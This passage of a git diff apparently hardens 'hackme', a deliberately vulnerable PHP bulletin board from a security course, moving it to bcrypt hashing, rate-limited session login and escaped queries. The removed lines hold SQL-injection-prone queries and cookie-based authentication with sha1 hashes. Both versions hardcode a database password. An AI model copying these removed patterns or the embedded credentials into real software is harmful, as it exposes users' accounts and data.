diff --git a/_css/style.css b/_css/style.css
new file mode 100755
index 0000000..75fa603
--- /dev/null
+++ b/_css/style.css
@@ -0,0 +1,485 @@
+body {
+	margin: 20px 0px 0px 0px;
+	padding: 0;
+	background: #191919 url(../images/img07.jpg) no-repeat right top;
+	font-family: Tahoma, Geneva, sans-serif;
+	font-size: 11px;
+	color: #3C3C3C;
+}
+
+h1, h2, h3 {
+	margin: 0;
+	font-family: Arial, Helvetica, sans-serif;
+	font-weight: normal;
+	color: #300;
+}
+
+h1 {
+	font-size: 44px;
+}
+
+h2 {
+	font-size: 18px;
+}
+
+h3 {
+}
+
+p, ul, ol {
+	margin-top: 0;
+	line-height: 240%;
+	text-align: justify;
+}
+
+ul, ol {
+}
+
+blockquote {
+}
+
+a {
+	color: #900;
+}
+
+a:hover {
+	text-decoration: none;
+}
+
+a img {
+	border: none;
+}
+
+img.left {
+	float: left;
+	margin: 7px 30px 0 0;
+}
+
+img.right {
+	float: right;
+	margin: 7px 0 0 30px;
+}
+
+hr {
+	display: none;
+}
+
+.list1 {
+}
+
+.list1 li {
+	float: left;
+	line-height: normal;
+}
+
+.list1 li img {
+	margin: 0 30px 30px 0;
+}
+
+.list1 li.alt img {
+	margin-right: 0;
+}
+
+#wrapper {
+}
+
+/* Header */
+
+#header {
+	width: 930px;
+	height: 70px;
+	margin: 0px auto;
+}
+
+/* Menu */
+
+#menu {
+}
+
+#menu ul {
+	margin: 0;
+	padding: 8px 0px 0px 0px;
+	list-style: none;
+	line-height: normal;
+}
+
+#menu li {
+	display: block;
+	float: left;
+}
+
+#menu a {
+	display: block;
+	float: left;
+	height: 28px;
+	background: #900;
+	margin-right: 3px;
+	padding: 8px 30px 0px 35px;
+	letter-spacing: -1px;
+	text-decoration: none;
+	text-align: center;
+	text-transform: lowercase;
+	font-family: Arial, Helvetica, sans-serif;
+	font-size: 14px;
+	font-weight: normal;
+	color: #FFFFFF;
+}
+
+#menu a:hover {
+	text-decoration: none;
+}
+
+#menu li.current_page_item {
+}
+
+#menu li.current_page_item a {
+}
+
+#menu .first {
+}
+
+/* Search */
+
+#search {
+	float: right;
+	padding: 10px 10px 0px 0px;
+}
+
+#search form {
+	float: right;
+	margin: 0;
+	padding: 4px 0px 0 0;
+}
+
+#search fieldset {
+	margin: 0;
+	padding: 0;
+	border: none;
+}
+
+#search input {
+	float: left;
+	font: 12px Georgia, "Times New Roman", Times, serif;
+}
+
+#search-text {
+	width: 213px;
+	height: 28px;
+	padding: 6px 0 0 7px;
+	border: none;
+	background: url(../images/img02.jpg) no-repeat left top;
+	color: #000000;
+}
+
+#search-submit {
+	width: 82px;
+	height: 28px;
+	margin-left: 10px;
+	padding: 0px 5px;
+	color:#900
+	border: none;
+	text-indent: -9999px;
+	color: #FFFFFF;
+}
+
+/* Page */
+
+#page {
+	width: 930px;
+	margin: 0px auto;
+	padding: 10px 10px 10px 10px;
+	background: #E1E1E1;
+}
+
+#page-bgtop {
+}
+
+#page-bgbtm {
+	overflow: hidden;
+}
+
+/** LOGO */
+
+#logo {
+	width: 930px;
+	height: 135px;
+	margin: 0 auto;
+	background-color:#900;
+}
+
+#logo h1, #logo p {
+	margin: 0px;
+	line-height: normal;
+	text-transform: lowercase;
+	font-weight: normal;
+	color: #FFFFFF;
+}
+
+#logo p {
+	margin-top: -4px;
+	padding: 0px 0px 0px 145px;
+	text-transform: lowercase;
+	font-family: Georgia, "Times New Roman", Times, serif;
+	font-size: 13px;
+	color: #FFFFFF;
+}
+
+#logo h1 {
+	padding: 30px 0px 0px 140px;
+	letter-spacing: -1px;
+	font-size: 48px;
+}
+
+#logo h1 a {
+	text-decoration: none;
+	color: #FFFFFF;
+}
+
+#logo a {
+	text-decoration: none;
+	color: #FFFFFF;
+}
+
+#banner {
+	padding-bottom: 20px;
+}
+
+/* Content */
+
+#content {
+	float: right;
+	width: 930px;
+	padding: 0px 0px 0px 0px;
+}
+
+/* Post */
+
+.post {
+	background: url(../images/img05.jpg) repeat-y left top;
+}
+
+.post-bgtop {
+	background: url(../images/img04.jpg) no-repeat left top;
+}
+
+.post-bgbtm {
+	padding: 0px 30px 20px 30px;
+	background: url(../images/img06.jpg) no-repeat left bottom;
+}
+
+.post .title {
+	height: 44px;
+	margin: 0px;
+	padding: 36px 0px 0px 0px;
+	background: url(../images/img11.jpg) repeat-x left bottom;
+	
+	letter-spacing: -2px;
+	text-transform: lowercase;
+	font-size: 36px;
+	color: #900;
+}
+
+.post .title a {
+	letter-spacing: -2px;
+	text-decoration: none;
+	text-transform: lowercase;
+	font-size: 36px;
+	color: #900;
+}
+
+.post .title a:hover {
+	color: #424242;
+}
+
+.post .meta {
+	margin-left: 2px;
+	padding: 4px 30px 2px 0px;
+	text-transform: uppercase;
+	font-family: Arial, Helvetica, sans-serif;
+	font-weight: bold;
+	font-size: 11px;
+	color: #66665E;
+}
+
+.post .meta span {
+	margin: 0px;
+}
+
+.post .meta a {
+	text-decoration: none;
+}
+
+.post .entry {
+	padding: 10px 0px 0px 0px;
+}
+
+.post .comments {
+	display: block;
+	width: 120px;
+	height: 18px;
+	margin: 0px;
+	padding: 3px 0px 0px 40px;
+	background: #90BF35;
+	border: 1px solid #5F817E;
+	text-decoration: none;
+	font-family: Arial, Helvetica, sans-serif;
+	font-size: 11px;
+	text-decoration: none;
+	font-weight: bold;
+	color: #FFFFFF;
+}
+
+/* Sidebar */
+
+#sidebar {
+	float: left;
+	width: 310px;
+	font-family: Arial, Helvetica, sans-serif;
+}
+
+#sidebar ul {
+	margin: 0;
+	padding: 0;
+	background:  none;
+	list-style: none;
+	line-height: normal;
+}
+
+#sidebar li {
+	background: url(../images/img09.jpg) repeat-y left top;
+}
+
+#sidebar li ul {
+	margin: 0px 0px;
+	padding: 0px 0px 20px 0px;
+	background: url(../images/img10.jpg) no-repeat left bottom;
+}
+
+#sidebar li li {
+	margin: -20px 30px 20px 30px;
+	padding: 8px 0px 8px 10px;
+	border-bottom: 1px solid #E0E0E0;
+	background: url(../images/img12.jpg) no-repeat left 13px;
+}
+
+#sidebar li li a {
+	font-weight: normal;
+}
+
+#sidebar li li a:hover {
+	color: #900;
+}
+
+#sidebar p {
+	margin: 0;
+	padding: 0px 14px;
+}
+
+#sidebar h2 {
+	height: 50px;
+	margin: 0px;
+	padding: 30px 0px 13px 30px;
+	background: url(../images/img08.jpg) no-repeat left top;
+	letter-spacing: -1px;
+	text-transform: lowercase;
+	font-size: 24px;
+	font-weight: normal;
+	color: #900;
+}
+
+#sidebar p {
+	line-height: 200%;
+}
+
+#sidebar a {
+	text-align: left;
+	text-decoration: none;
+	font-weight: bold;
+	color: #666666;
+}
+
+
+table td {
+	vertical-align: top;
+	padding-bottom: 20px;
+}
+
+/* Calendar */
+
+
+#calendar {
+}
+
+#calendar caption {
+	padding-bottom: 5px;
+	font-weight: bold;
+}
+
+#calendar table {
+	width: 100%;
+	border-collapse: collapse;
+	border-bottom: 1px solid #24130F;
+	border-left: 1px solid #24130F;
+	border-right: 1px solid #24130F;
+}
+
+#calendar thead th {
+	padding: 5px 0;
+	text-align: center;
+	border-top: 1px solid #24130F;
+	border-left: 1px solid #24130F;
+	background: #24130F;
+}
+
+#calendar tbody td {
+	padding: 5px 0;
+	text-align: center;
+	border-top: 1px solid #24130F;
+	border-left: 1px solid #24130F;
+	border-bottom: 1px solid #24130F;
+}
+
+#calendar tfoot td {
+	padding: 5px;
+	border-left: 1px solid #24130F;
+	border-bottom: 1px solid #24130F;
+}
+
+#calendar tfoot #next {
+	border-top: 1px solid #24130F;
+	text-align: right;
+}
+
+#calendar tfoot #prev {
+	border-top: 1px solid #24130F;
+}
+
+#calendar .pad {
+	border-bottom: 1px solid #24130F;
+}
+
+#calendar #today {
+	background: #24130F;
+}
+
+/* Footer */
+
+#footer {
+	width: 920px;
+	height: 100px;
+	margin: 0 auto;
+	padding: 0;
+}
+
+#footer-bgcontent {
+}
+
+#footer p {
+	margin: 0;
+	padding: 30px 0px 0px 0px;
+	text-align: center;
+	line-height: normal;
+	font-size: 11px;
+}
+
+#footer a {
+}
diff --git a/_inc/footer.php b/_inc/footer.php
new file mode 100755
index 0000000..1fe1024
--- /dev/null
+++ b/_inc/footer.php
@@ -0,0 +1,8 @@
+				</div>
+			</div>
+		</div>
+	</div>
+	<div id="footer"></div>
+	<!-- end #footer -->
+</body>
+</html>
\ No newline at end of file
diff --git a/_inc/functions.php b/_inc/functions.php
new file mode 100644
index 0000000..f4eb893
--- /dev/null
+++ b/_inc/functions.php
@@ -0,0 +1,305 @@
+<?php
+
+/* A simple wrapper for the PHP password functions */
+class Password {
+	const COST = 14;
+	const HASH = PASSWORD_DEFAULT;
+
+	private $dictionary = "/usr/share/dict/words";
+
+	private $hash;
+
+	private $password;
+
+	/* 
+	 * Constructor
+	 * Creates and hashes a given password
+	 * $password string
+	 */
+	public function __construct($password) {
+		$this->password = trim($password);
+		$this->hash($this->password);
+	}
+
+	/*
+	 * hash()
+	 * Generates a salted and hashed password
+	 * $password string, password to hash
+	 */
+	public function hash($password) {
+		$this->hash = password_hash($password, self::HASH, ['cost' => self::COST]);
+
+		return $this->hash;
+	}
+
+	/*
+	 * getHash()
+	 * Returns the hashed password
+	 */
+	public function getHash() {
+		return $this->hash;
+	}
+
+	/*
+	 * verify()
+	 * Matches password to a given hash
+	 * @return bool
+	 */
+	public function verify($hash) {
+		return password_verify($this->password, $hash);
+	}
+
+
+	/* 
+	 * check()
+	 * Checks if password matches password requirements
+	 */
+	public function check() {
+		$length = strlen($this->password);
+
+		//Password is too short
+		if ($length < 8) return false;
+
+		// count how many lowercase, uppercase, and digits are in the password 
+	    $uc = 0; $lc = 0; $num = 0; $other = 0;
+	    for ($i = 0; $i < $length; $i++) {
+	        $c = substr($this->password, $i, 1);
+	        if (preg_match('/^[[:upper:]]$/',$c)) {
+	            $uc++;
+	        } elseif (preg_match('/^[[:lower:]]$/',$c)) {
+	            $lc++;
+	        } elseif (preg_match('/^[[:digit:]]$/',$c)) {
+	            $num++;
+	        } else {
+	            $other++;
+	        }
+	    }
+
+	    //Enforce at least two types of characters
+	    $max = $length - 2;
+
+	    //Too many uppercase letters
+	    if ($uc > $max) return false;
+
+	    //Too many lowercase letters
+	    if ($lc > $max) return false;
+
+	    //Too many numbers
+	    if ($num > $max) return false;
+
+	    //Too many special characters
+	    if ($other > $max) return false;
+
+	    //Check that password is not a dictionary word
+		if (is_readable($this->dictionary)) {
+		    if ($fh = fopen($this->dictionary, 'r')) {
+		        while (!(feof($fh))) {
+		            $word = preg_quote(trim(strtolower(fgets($fh, 1024))), '/');
+		            if ($word === strtolower($this->password)) {
+		            	echo $word;
+		        		fclose($fh);
+		            	return false;
+		            }
+		        }
+		    }
+		}
+
+		return true;
+	}
+}
+
+/* Handle site authentication and database operations */
+class SiteAuthentication {
+	//Only allow a certain number of attempts per minute
+	const MAX_ATTEMPTS = 5;
+	const TIME_RANGE = 60;
+
+	//Database information
+	const DBUser = "security-project";
+	const DBPassword = "69BgYftvzpEH";
+	const DBName = "hackme";
+
+	//Site database
+	private $DB;
+
+	public $logged_in = false;
+
+	//Start the PHP session and connect to the database
+	function __construct() {
+		session_start();
+		if (isset($_SESSION["username"])) $this->logged_in = true;
+		
+		//Connect to database
+		$this->connect();
+	}
+
+	//Cleanup functions
+	function __destruct() {
+		//Close DB connection
+		if (isset($this->DB)) {
+			$this->DB->close();
+		}
+	} 
+
+	//Create database object
+	private function connect() {
+		//Don't allow making the DB again
+		if (isset($this->DB)) return $this->DB;
+
+		$this->DB = new mysqli("localhost", self::DBUser, self::DBPassword, self::DBName);
+
+		if ($this->DB->connect_errno) {
+			die($this->DB->connect_error);
+		}
+
+		return $this->DB;
+	}
+
+	/*
+	 * login()
+	 * Logs an user into the site
+	 * $username string, Username to check against database
+	 * $password string, Password for user
+	 * @return bool
+	 */
+	public function login($username, $password) {
+		if ($this->logged_in) return true;
+		//Make sure username and password are provided
+		if (!isset($username) || !isset($password)) return false;
+
+		$username = $this->escape(trim($username));
+		$password = $this->escape(trim($password));
+
+		$result = $this->query("SELECT pass, last_attempt, attempts FROM users WHERE username = '%s'", array($username));
+
+		if (count($result) === 0) return false;
+
+		$password = new Password($password);
+
+		//Rate limit password guesses per minute
+		//Once the user has guessed 5 times, they have to wait a minute before trying again
+		$attempt_time = time();
+		$attempts = (int) $result[0]->attempts;
+		//Reset attempt counter if user hasn't attempted in last minute
+		if ($attempt_time > ($result[0]->last_attempt + self::TIME_RANGE)) {
+			$attempts = 0;
+		}
+		$attempts++;
+
+		//User has exceeded max number of attempts in last minute
+		if ($attempts > self::MAX_ATTEMPTS) return false;
+
+		//Update user with attempt count and current time
+		$this->query("UPDATE users SET last_attempt = '%d', attempts = '%d' WHERE username = '%s'", array(
+			$attempt_time,
+			$attempts,
+			$username
+		));
+
+		if (!$password->verify($result[0]->pass)) return false;
+
+		$_SESSION["username"] = $username;
+		$_SESSION["login_time"] = $attempt_time;
+
+		$this->logged_in = true;
+
+		return true;
+	}
+
+	/* 
+	 * logout()
+	 * Logs the user out and destroys the current session (invalidating the session both client side and server side)
+	 * @return bool
+	 */
+	public function logout() {
+		// Unset all of the session variables.
+		$_SESSION = array();
+
+		//Get rid of all user session cookies
+		if (ini_get("session.use_cookies")) {
+		    $params = session_get_cookie_params();
+		    setcookie(session_name(), '', time() - 42000,
+		        $params["path"], $params["domain"],
+		        $params["secure"], $params["httponly"]
+		    );
+		}
+
+		// Finally, destroy the session.
+		session_destroy();
+
+		$this->logged_in = false;
+
+		return true;
+	}
+
+	/*
+	 * createUser()
+	 * $username string, Username for new user
+	 * $password string, Password to be hashed and stored in DB
+	 * $firstName string, First name of user
+	 * $lastName string, Last name of user
+	 */
+	public function createUser($username, $password, $firstName, $lastName) {
+		if (!$this->DB) return false;
+		if (!$username || !$password || !$firstName || !$lastName) return false;
+
+		$password = new Password($password);
+
+		//Bad password
+		if (!$password->check()) return false;
+
+		$users = $this->query("SELECT username FROM users WHERE username = '%s'", array($username));
+
+		//User already exists
+		if (count($users) > 0) return false;
+
+		$createUser = $this->query("INSERT INTO users (username, pass, fname, lname) VALUES ('%s', '%s', '%s', '%s')", array(
+			htmlspecialchars($username), 
+			$password->getHash(),
+			htmlspecialchars($firstName),
+			htmlspecialchars($lastName)
+		));
+
+		return $createUser;
+	}
+
+	/*
+	 * query()
+	 * $query string, MySQL query string with parametrized values
+	 * $values array, Array of values to insert into query string
+	 * $require_login bool, Whether this query should require the user to be logged in
+	 */
+	public function query($query, $values = array(), $require_login = false) {
+		if (!$this->DB) return array();
+		if ($require_login && !$this->logged_in) return array();
+		if (!isset($query)) return array();
+
+		//Make sure all values are properly escaped
+		$values = array_map(array($this, "escape"), $values);
+		//Create statement
+		$statement = vsprintf($query, $values);
+
+		//Get the results of the query
+		if ($result = $this->DB->query($statement)) {
+			$rows = true;
+			if (isset($result->num_rows)) {
+				$rows = array();
+				while ($row = $result->fetch_object()) {
+					$rows[] = $row;
+				}				
+				$result->close();
+			}
+			return $rows;
+		}
+
+		return false;
+	}
+
+	public function escape($value) {
+		if (!$this->DB) return false;
+		return $this->DB->real_escape_string($value);
+	}
+
+}
+
+$auth = new SiteAuthentication();
\ No newline at end of file
diff --git a/_inc/header.php b/_inc/header.php
new file mode 100755
index 0000000..1946381
--- /dev/null
+++ b/_inc/header.php
@@ -0,0 +1,50 @@
+<?php
+//Force logging in
+if (!$auth->logged_in && defined("MEMBERS_ONLY") && MEMBERS_ONLY === true) {
+	header("Location: index.php");
+}
+?>
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+	<head>
+		<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+		<title>hackme</title>
+		<link href="_css/style.css" rel="stylesheet" type="text/css" media="screen" />
+	</head>
+<body>
+	<div id="header">
+		<div id="menu">
+			<ul>
+	        <?php if(!$auth->logged_in) : ?>
+				<li><a href="index.php">Login</a></li>
+				<li><a href="register.php">Register</a></li>
+	        <?php else : ?>
+	        	<li><a href="members.php">Main</a></li>
+				<li><a href="post.php">Post</a></li>
+	            <li><a href="logout.php">logout</a></li>
+	        <?php endif; ?>
+			</ul>
+		</div>
+		<!-- end #menu -->
+	</div>
+	<!-- end #header -->
+	<div id="logo">
+		<h1><a href="#">hackme </a></h1>
+		<p><em>an information security bulletin board</em></p>
+	</div>
+	<hr />
+	<!-- end #logo -->
+	<div id="page">
+		<div id="page-bgtop">
+			<div id="page-bgbtm">
+				<div id="content">
+				<?php if ($auth->logged_in) : ?>
+				<div class="post">
+					<div class="post-bgtop">
+						<div class="post-bgbtm">
+				        	<h2 class = "title">hackme bulletin board</h2>
+				        	<p>Logged in as <a href="#"><?php echo $_SESSION["username"]; ?></a></p>
+				        </div>
+				    </div>
+				</div>
+				<?php endif; ?>
diff --git a/connect.php b/connect.php
deleted file mode 100644
index 725e17c..0000000
--- a/connect.php
+++ /dev/null
@@ -1,8 +0,0 @@
-<?php
-	function connect()
-	{
-		// Connects to the Database 
-		mysql_connect("localhost", "security-project", "69BgYftvzpEH", false, 65536) or die(mysql_error());
-		mysql_select_db("hackme") or die(mysql_error()); 
-	}
-?>
diff --git a/db_schema.sql b/db_schema.sql
index 137a260..ada5a9b 100644
--- a/db_schema.sql
+++ b/db_schema.sql
@@ -1,39 +1,63 @@
--- SQL Dump
+-- MySQL dump 10.13  Distrib 5.6.27, for debian-linux-gnu (x86_64)
 --
-
-SET SQL_MODE="NO_AUTO_VALUE_ON_ZERO";
-
---
--- Database: `hackme`
---
-
--- --------------------------------------------------------
+-- Host: localhost    Database: hackme
+-- ------------------------------------------------------
+-- Server version	5.6.27-0ubuntu0.15.04.1
+
+/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
+/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
+/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
+/*!40101 SET NAMES utf8 */;
+/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
+/*!40103 SET TIME_ZONE='+00:00' */;
+/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
+/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
+/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
+/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
 
 --
 -- Table structure for table `threads`
 --
 
-CREATE TABLE IF NOT EXISTS `threads` (
-  `id` int(11) NOT NULL auto_increment,
+DROP TABLE IF EXISTS `threads`;
+/*!40101 SET @saved_cs_client     = @@character_set_client */;
+/*!40101 SET character_set_client = utf8 */;
+CREATE TABLE `threads` (
+  `id` int(11) NOT NULL AUTO_INCREMENT,
   `username` varchar(20) NOT NULL,
   `title` varchar(50) NOT NULL,
   `message` text NOT NULL,
   `date` bigint(20) NOT NULL,
-  PRIMARY KEY  (`id`),
+  PRIMARY KEY (`id`),
   KEY `UNAME_FK` (`username`)
-) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=4 ;
-
--- --------------------------------------------------------
+) ENGINE=MyISAM AUTO_INCREMENT=12 DEFAULT CHARSET=latin1;
+/*!40101 SET character_set_client = @saved_cs_client */;
 
 --
 -- Table structure for table `users`
 --
 
-CREATE TABLE IF NOT EXISTS `users` (
+DROP TABLE IF EXISTS `users`;
+/*!40101 SET @saved_cs_client     = @@character_set_client */;
+/*!40101 SET character_set_client = utf8 */;
+CREATE TABLE `users` (
   `username` char(20) NOT NULL,
-  `pass` char(40) NOT NULL,
+  `pass` binary(60) DEFAULT NULL,
   `fname` varchar(25) NOT NULL,
   `lname` varchar(25) NOT NULL,
-  PRIMARY KEY  (`username`)
+  `last_attempt` int(10) DEFAULT NULL,
+  `attempts` int(11) DEFAULT NULL,
+  PRIMARY KEY (`username`)
 ) ENGINE=MyISAM DEFAULT CHARSET=latin1 COMMENT='Table containing user information. username should be unique';
-
+/*!40101 SET character_set_client = @saved_cs_client */;
+/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
+
+/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
+/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
+/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
+/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
+/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
+/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
+/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
+
+-- Dump completed on 2015-11-14 21:39:14
diff --git a/footer.php b/footer.php
deleted file mode 100644
index 13d5503..0000000
--- a/footer.php
+++ /dev/null
@@ -1,5 +0,0 @@
-</div>
-	</div>
-</div>
-<div id="footer"></div>
-<!-- end #footer -->
\ No newline at end of file
diff --git a/header.php b/header.php
deleted file mode 100644
index a40ebad..0000000
--- a/header.php
+++ /dev/null
@@ -1,32 +0,0 @@
-<link href="style.css" rel="stylesheet" type="text/css" media="screen" />
-</head>
-<body>
-<div id="header">
-	<div id="menu">
-		<ul>
-        <?php
-			if(!isset($_COOKIE['hackme'])){ ?>
-				<li><a href="index.php">Login</a></li>
-				<li><a href="register.php">Register</a></li>
-        <?php
-			}else{
-		?>
-        		<li><a href="members.php">Main</a></li>
-				<li><a href="post.php">Post</a></li>
-                <li><a href="logout.php">logout</a></li>
-        <?php }?>
-		</ul>
-	</div>
-	<!-- end #menu -->
-</div>
-<!-- end #header -->
-<div id="logo">
-	<h1><a href="#">hackme </a></h1>
-	<p><em>an information security bulletin board</em></p>
-</div>
-<hr />
-<!-- end #logo -->
-<div id="page">
-	<div id="page-bgtop">
-		<div id="page-bgbtm">
-			<div id="content">
diff --git a/index.php b/index.php
old mode 100644
new mode 100755
index 89a4fa0..1616a49
--- a/index.php
+++ b/index.php
@@ -1,55 +1,34 @@
-<?php
-	include('connect.php');
-	if(isset($_COOKIE['hackme']))
-	{
-		header("Location: members.php");
-	}
-?>
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<?php 
+require("_inc/functions.php");
 
+//Redirect to members page if logged in
+if ($auth->logged_in) {
+	header("Location: members.php");
+}
 
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<meta http-equiv="content-type" content="text/html; charset=utf-8" />
-<title>hackme</title>
-<meta name="keywords" content="" />
-<meta name="description" content="" />
-<link href="style.css" rel="stylesheet" type="text/css" media="screen" />
-<?php
-	include('header.php');
+require("_inc/header.php");
 ?>
+
 <div class="post">
 	<div class="post-bgtop">
 		<div class="post-bgbtm">
 			<h2 class="title"><a href="#">Welcome to hackme </a></h2>
-				<div class="entry">
-		<?php
-			if(!isset($_COOKIE['hackme']))
-				{
-				?>
+			<div class="entry">
+				<?php if (!$auth->logged_in) : ?>
 	           	<form method="post" action="members.php">
-				<h2> LOGIN </h2>
-				<table>
-					<tr> <td> Username </td> <td> <input type="text" name="username" /> </td> </tr>
-					<tr> <td> Password </td> <td> <input type="password" name="password" /> </td>  
-                    <td> <input type="submit" name = "submit" value="Login" /> </td></tr>
-				</table>
-				</form>
-					
-				<hr style=\"color:#000033\" />
-					
-			<p></p><p>If you are not a member yet, please click <a href="register.php">here</a> to register.</p>
-           <?php
-				}
-		?>
-	</div>
-	</div>
+					<h2>LOGIN</h2>
+					<table>
+						<tr> <td> Username </td> <td> <input type="text" name="username" /> </td> </tr>
+						<tr> <td> Password </td> <td> <input type="password" name="password" /> </td>  
+	                    <td> <input type="submit" name = "submit" value="Login" /> </td></tr>
+					</table>
+				</form>					
+				<hr style=\"color:#000033\" />					
+				<p></p><p>If you are not a member yet, please click <a href="register.php">here</a> to register.</p>
+           		<?php endif; ?>
+			</div>
+		</div>
 	</div>
 </div>
 <!-- end #sidebar -->
-	<?php
-		include('footer.php');
-	?>
-
-</body>
-</html>
+<?php require('_inc/footer.php'); ?>
diff --git a/logout.php b/logout.php
old mode 100644
new mode 100755
index da0f162..a92fe83
--- a/logout.php
+++ b/logout.php
@@ -1,5 +1,7 @@
 <?php
-setcookie (hackme, "", time() - 3600);
-setcookie(hackme_pass, "", time() - 3600);
+require("_inc/functions.php");
+
+if ($auth->logged_in) $auth->logout();
+
 header("Location: index.php");
 ?>
\ No newline at end of file
diff --git a/members.php b/members.php
old mode 100644
new mode 100755
index c324e55..a6652ea
--- a/members.php
+++ b/members.php
@@ -1,82 +1,30 @@
 <?php
-	// Connects to the Database 
-	include('connect.php');
-	connect();
-	
-	//if the login form is submitted 
-	if (isset($_POST['submit'])) {
-		
-		$_POST['username'] = trim($_POST['username']);
-		if(!$_POST['username'] | !$_POST['password']) {
-			die('<p>You did not fill in a required field.
-			Please go back and try again!</p>');
-		}
-		
-		$passwordHash = sha1($_POST['password']);
-		$check = mysql_query("SELECT * FROM users WHERE username = '".$_POST['username']."'")or die(mysql_error());
-		
- 		//Gives error if user already exist
- 		$check2 = mysql_num_rows($check);
-		if ($check2 == 0) {
-			die("<p>Sorry, user name does not exisits.</p>");
-		}
-		else
-		{
-			while($info = mysql_fetch_array( $check )) 	{
-			 	//gives error if the password is wrong
-				if ($passwordHash != $info['pass']) {
-					die('Incorrect password, please try again.');
-				}
-			}
-			$hour = time() + 3600; 
-			setcookie(hackme, $_POST['username'], $hour); 
-			setcookie(hackme_pass, $passwordHash, $hour);
-			header("Location: members.php");
-		}
-	}
-		?>  
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-<title>hackme</title>
-<link href="style.css" rel="stylesheet" type="text/css" media="screen" />
-<?php
-	include('header.php');
-?>
-<div class="post">
-	<div class="post-bgtop">
-		<div class="post-bgbtm">
-        <h2 class = "title">hackme bulletin board</h2>
-        	<?php
-            if(!isset($_COOKIE['hackme'])){
-				 die('Why are you not logged in?!');
-			}else
-			{
-				print("<p>Logged in as <a>$_COOKIE[hackme]</a></p>");
-			}
-			?>
-        </div>
-    </div>
-</div>
-
-<?php
-	$threads = mysql_query("SELECT * FROM threads ORDER BY date DESC")or die(mysql_error());
-	while($thisthread = mysql_fetch_array( $threads )){
-?>
-	<div class="post">
-	<div class="post-bgtop">
-	<div class="post-bgbtm">
-		<h2 class="title"><a href="show.php?pid=<? echo $thisthread[id] ?>"><? echo $thisthread[title]?></a></h2>
-							<p class="meta"><span class="date"> <? echo date('l, d F, Y',$thisthread[date]) ?> - Posted by <a href="#"><? echo $thisthread[username] ?> </a></p>
+define("MEMBERS_ONLY", true);
 
-	</div>
-	</div>
-	</div> 
+require("_inc/functions.php");
 
-<?php
+//if the login form is submitted 
+if (isset($_POST['submit']) && isset($_POST["password"]) && isset($_POST["username"])) {
+	$auth->login($_POST["username"], $_POST["password"]);
 }
-	include('footer.php');
+
+require("_inc/header.php");
+
+$threads = $auth->query("SELECT * FROM threads ORDER BY date DESC", array(), true);
+foreach($threads as $thread) :
 ?>
-</body>
-</html>
+	<div class="post">
+		<div class="post-bgtop">
+			<div class="post-bgbtm">
+				<h2 class="title">
+					<a href="show.php?pid=<?php echo htmlspecialchars($thread->id); ?>"><?php echo htmlspecialchars($thread->title); ?>
+					</a>
+				</h2>
+				<p class="meta">
+					<span class="date"><?php echo date('l, d F, Y', htmlspecialchars($thread->date)); ?></span> - Posted by <a href="#"><?php echo htmlspecialchars($thread->username); ?></a>
+				</p>
+			</div>
+		</div>
+	</div> 
+<?php endforeach; ?>
+<?php include('_inc/footer.php'); ?>
diff --git a/post.php b/post.php
old mode 100644
new mode 100755
index 79e94d6..283f341
--- a/post.php
+++ b/post.php
@@ -1,50 +1,37 @@
-<?php
-// Connects to the Database 
-	include('connect.php');
-	connect();
-	
-	//if the login form is submitted 
-	if (isset($_POST['post_submit'])) {
-		
-		$_POST['title'] = trim($_POST['title']);
-		if(!$_POST['title'] | !$_POST['message']) {
-			include('header.php');
-			die('<p>You did not fill in a required field.
-			Please go back and try again!</p>');
-		}
-		
-		mysql_query("INSERT INTO threads (username, title, message, date) VALUES('".$_COOKIE['hackme']."', '". $_POST['title']."', '". $_POST[message]."', '".time()."')")or die(mysql_error());
-		
-		//mysql_query("INSERT INTO threads (username, title, message, date) VALUES('".$_COOKIE['hackme']."', '". $_POST['title']."', '". $_POST[message]."', CURDATE() )")or die(mysql_error());
-		
-		
-		header("Location: members.php");
+<?php 
+define("MEMBERS_ONLY", true);
+
+require("_inc/functions.php");
+
+//if the login form is submitted 
+if (isset($_POST['post_submit'])) {
+	if(!isset($_POST['title']) || !isset($_POST['message'])) {
+		die('<p>You did not fill in a required field.
+		Please go back and try again!</p>');
 	}
-?>  
-<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
-<html xmlns="http://www.w3.org/1999/xhtml">
-<head>
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
-<title>hackme</title>
